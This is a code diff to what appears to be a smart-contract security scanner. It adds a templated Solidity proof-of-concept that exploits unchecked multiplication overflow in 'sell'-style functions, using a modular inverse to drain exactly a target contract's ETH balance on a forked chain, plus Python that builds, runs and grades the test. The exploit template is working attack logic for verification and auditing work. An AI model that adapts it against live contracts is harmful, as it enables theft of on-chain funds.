@@ -146,6 +146,7 @@ class PayloadVerdict:
     @property
     def status_word(self) -> str:
         return {"confirmed": "CONFIRMED EXPLOIT", "manual": "LATENT / MANUAL REVIEW",
+                "conditional": "LOGIC-CONFIRMED (ECONOMICALLY CONDITIONAL)",
                 "reverted": "FALSE POSITIVE", "no_change": "FALSE POSITIVE",
                 "error": "NOT RUN"}.get(self.outcome, self.outcome.upper())
 
@@ -158,6 +159,7 @@ class PayloadVerdict:
     def report_line(self) -> str:
         icon = {"confirmed": "CONFIRMED", "reverted": "NOT REPRODUCIBLE (reverted)",
                 "no_change": "NOT REPRODUCIBLE (no state/funds moved)",
+                "conditional": "LOGIC CONFIRMED (economically conditional)",
                 "manual": "MANUAL PoC REQUIRED", "error": "NOT RUN"}[self.outcome]
         return f"Payload attack: {icon} - {self.detail}"
 
@@ -356,6 +358,131 @@ def overflow_verdict(finding, fn, state_vars) -> PayloadVerdict:
     return PayloadVerdict(finding, "manual", detail, metrics=metrics, injected=inj)
 
 
+_MUL_OPERAND_RE = re.compile(r"\b(\w+)\s*\*\s*(\w+)")
+
+
+def _overflow_multiplier(fn) -> str | None:
+    """From a `sell`-like body, find the state var the caller amount is multiplied by (e.g. sellPrice).
+    Returns the operand that is NOT a function parameter - that's the on-chain multiplier we read live."""
+    body = getattr(fn, "body", "") or ""
+    params = {p.name for p in getattr(fn, "params", []) if getattr(p, "name", None)}
+    for a, b in _MUL_OPERAND_RE.findall(body):
+        if a in params and b not in params and b.isidentifier() and not b.isdigit():
+            return b
+        if b in params and a not in params and a.isidentifier() and not a.isdigit():
+            return a
+    return None
+
+
+# Self-contained exact-overflow PoC. Unlike the broken `contractEth + k*(maxUint+1)` loop (that term is
+# 0 under unchecked), this computes amount = contractEth * modinv(price) via Newton-Hensel lifting, so
+# amount*price wraps 2**256 to EXACTLY the contract balance. State injection is the TARGETED, sound kind:
+# stdstore writes the attacker the exact token balance the math needs, and `checked_write` reverts if the
+# slot is wrong (no silent fabrication). The ETH drained is the target's real balance, not injected. The
+# verdict is CONDITIONAL - we prove the LOGIC flaw and report the economic precondition (amount vs supply).
+_OVERFLOW_POC = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {{Test, console2, stdStorage, StdStorage}} from "forge-std/Test.sol";
+
+contract OverflowPoC is Test {{
+    using stdStorage for StdStorage;
+    address constant TARGET = {target};
+
+    function _u(bytes memory sig) internal view returns (bool ok, uint256 v) {{
+        bytes memory d; (ok, d) = TARGET.staticcall(sig);
+        if (ok && d.length >= 32) v = abi.decode(d, (uint256));
+    }}
+    // modular inverse of an ODD a, mod 2**256 (Newton-Hensel: 5 correct bits doubled 6x -> 256).
+    function _inv(uint256 a) internal pure returns (uint256 inv) {{
+        unchecked {{ inv = (3 * a) ^ 2;
+            inv *= 2 - a * inv; inv *= 2 - a * inv; inv *= 2 - a * inv;
+            inv *= 2 - a * inv; inv *= 2 - a * inv; inv *= 2 - a * inv; }}
+    }}
+    function test_overflow() public {{
+        address attacker = makeAddr("attacker");
+        (bool okP, uint256 price) = _u(abi.encodeWithSignature("{mul}()"));
+        (, uint256 supply) = _u(abi.encodeWithSignature("totalSupply()"));
+        uint256 contractEth = TARGET.balance;
+        console2.log("OVF_PRICE", price);
+        console2.log("OVF_SUPPLY", supply);
+        console2.log("OVF_TGT_ETH_BEFORE", contractEth);
+        if (!okP || price == 0 || price & 1 == 0 || contractEth == 0) {{
+            console2.log("OVF_SKIP", 1); return;   // need an odd, nonzero multiplier and a funded target
+        }}
+        uint256 amount;
+        unchecked {{ amount = contractEth * _inv(price); }}   // amount*price wraps to EXACTLY contractEth
+        console2.log("OVF_AMOUNT", amount);
+        console2.log("OVF_AMOUNT_GT_SUPPLY", amount > supply);
+        // TARGETED injection: give the attacker the exact token balance the math needs; checked_write
+        // reverts if the balanceOf slot can't be resolved, so we never fabricate against the wrong slot.
+        try this._inject(attacker, amount) {{}} catch {{ console2.log("OVF_INJECT_FAIL", 1); return; }}
+        uint256 attBefore = attacker.balance;
+        vm.prank(attacker, attacker);
+        (bool ok, ) = TARGET.call(abi.encodeWithSignature("{sell}", amount));
+        console2.log("OVF_CALL_OK", ok);
+        console2.log("OVF_ATT_ETH_GAIN", int256(attacker.balance) - int256(attBefore));
+        console2.log("OVF_TGT_ETH_DELTA", int256(TARGET.balance) - int256(contractEth));
+    }}
+    function _inject(address who, uint256 amt) external {{
+        stdstore.target(TARGET).sig("balanceOf(address)").with_key(who).checked_write(amt);
+    }}
+}}
+"""
+
+
+def build_overflow_exploit(finding, fn, target: str) -> str | None:
+    """Generate the corrected Tier-1 overflow PoC, or None if the shape isn't a caller-amount * on-chain
+    multiplier (then the caller falls back to the static tier classification)."""
+    if finding.detector != "pre-0.8-overflow" or fn is None:
+        return None
+    tier, _ = classify_overflow(fn, set())
+    if tier == 4:
+        return None                       # fabricated-state prerequisite -> never auto-run; stays LATENT
+    mul = _overflow_multiplier(fn)
+    if not mul or not _encodable(fn):
+        return None
+    sell = canonical_sig(fn)
+    return _OVERFLOW_POC.format(target=_addr_literal(target), mul=mul, sell=sell)
+
+
+_OVF_RE = re.compile(r"^\s*(OVF_[A-Z_]+)\s+(-?\d+|true|false)\s*$", re.M)
+
+
+def parse_overflow_outcome(finding, stdout: str, fallback: "PayloadVerdict") -> "PayloadVerdict":
+    """Interpret the overflow PoC logs. LOGIC proven + target drained -> CONDITIONAL (with the economic
+    precondition). Reverted -> dropped. No logs / compile fail -> the static tier fallback (never a
+    fabricated confirm)."""
+    vals = {k: v for k, v in _OVF_RE.findall(stdout)}
+    if "OVF_CALL_OK" not in vals:
+        return fallback                    # skipped (even/zero price), inject failed, or didn't compile
+    call_ok = vals["OVF_CALL_OK"] == "true"
+    att_gain = int(vals.get("OVF_ATT_ETH_GAIN", "0"))
+    tgt_delta = int(vals.get("OVF_TGT_ETH_DELTA", "0"))
+    amount = int(vals.get("OVF_AMOUNT", "0"))
+    supply = int(vals.get("OVF_SUPPLY", "0"))
+    price = int(vals.get("OVF_PRICE", "0"))
+    gt_supply = vals.get("OVF_AMOUNT_GT_SUPPLY") == "true"
+    metrics = {"call_ok": call_ok, "att_wei": att_gain, "att_tok": 0,
+               "tgt_wei": tgt_delta, "tgt_tok": 0, "code": 0}
+    injected = (f"Tier 1 vm.store (stdstore-verified): attacker balanceOf set to the exact wrap amount "
+                f"{amount} (= contractEth * modinv(price {price})); the ETH drained is the target's own, "
+                "not injected")
+    if not call_ok:
+        return PayloadVerdict(finding, "reverted", "overflow call reverts - SafeMath/checked arithmetic "
+                              "holds, or the balance guard can't be bypassed", metrics=metrics, injected=injected)
+    if tgt_delta < 0 and att_gain > 0:
+        econ = ("the required token balance EXCEEDS total supply, so it is acquirable only via a separate "
+                "mint/inflation bug -> THEORETICAL unless chained" if gt_supply else
+                "the required token balance is within total supply, so it is CRITICAL if those tokens are "
+                "buyable for less than the drained ETH")
+        detail = (f"unchecked `amount*{price}` overflow drains {-tgt_delta} wei from the target to the "
+                  f"attacker. Economic precondition: holding {amount} tokens (supply {supply}) - {econ}")
+        return PayloadVerdict(finding, "conditional", detail, profit_wei=-tgt_delta,
+                              metrics=metrics, injected=injected)
+    return PayloadVerdict(finding, "no_change", "overflow call succeeds but the target lost no ETH "
+                          "(payout path differs) - not reproduced", metrics=metrics, injected=injected)
+
+
 def _function_of(files: list[SourceFile], finding) -> Function | None:
     for f in files:
         for c in f.contracts:
@@ -387,8 +514,23 @@ def run_payloads(findings: list, files: list[SourceFile], target: str, rpc_url: 
     for f in findings:
         fn = _function_of(files, f)
         if f.detector == "pre-0.8-overflow" and fn is not None:
-            # Phase 3: classify the overflow into a sound tier; never fabricate attacker state.
-            verdicts.append(overflow_verdict(f, fn, None))
+            # Phase 3 Tier-1: run the corrected overflow PoC if the shape fits; else static classification.
+            otest = build_overflow_exploit(f, fn, target)
+            static = overflow_verdict(f, fn, None)
+            if otest is None:
+                verdicts.append(static)
+                continue
+            (proj / "test" / "Exploit.t.sol").write_text(otest, encoding="utf-8")
+            cmd = [forge, "test", "--mp", "test/Exploit.t.sol", "--fork-url", rpc_url, "-vv"]
+            if fork_block:
+                cmd += ["--fork-block-number", str(fork_block)]
+            try:
+                r = subprocess.run(cmd, cwd=proj, capture_output=True, text=True, timeout=timeout)
+                verdicts.append(parse_overflow_outcome(f, r.stdout + "\n" + r.stderr, static))
+            except subprocess.TimeoutExpired:
+                verdicts.append(static)
+            except Exception:
+                verdicts.append(static)
             continue
         test = build_exploit(f, fn, target, wallet) if fn is not None else None
         if test is None:
